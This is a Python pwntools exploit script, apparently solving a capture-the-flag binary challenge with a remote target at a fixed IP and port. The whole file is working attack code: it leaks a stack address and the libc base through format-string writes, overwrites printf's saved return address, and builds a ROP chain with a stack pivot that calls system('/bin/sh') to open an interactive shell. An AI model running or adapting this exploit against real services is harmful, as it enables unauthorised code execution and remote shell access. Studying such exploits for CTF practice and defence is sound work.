#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './a.out_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = '103.174.115.12', 5000

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

breakrva 0x11e8

break *printf+198
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    stack = int(io.recv(14), 16)
     
    printf_rip = stack - 0x18
    payload = b'|%p|%105c%10$hhn'.ljust(16, b'\x00') + p64(printf_rip)
    io.sendline(payload)

    io.recvuntil(b'|')
    libc.address = int(io.recvuntil(b'|', drop=True), 16) - 0x210963

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    pop_rsp = rop.find_gadget(['pop rsp', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]

    printf_rip = stack - 0x140
    payload = b'|%p|%105c%10$hhn'.ljust(16, b'\x00') + p64(printf_rip)
    payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.sym['system'])
    io.sendline(payload)

    stack_rop = stack-0x110
    printf_rip = stack - 0x268
    payload = fmtstr_payload(8, {
        printf_rip: pop_rsp,
        printf_rip+0x8: stack_rop,
    })
    io.sendline(payload)

    log.info('stack: %#x', stack)
    log.info("libc base: %#x", libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
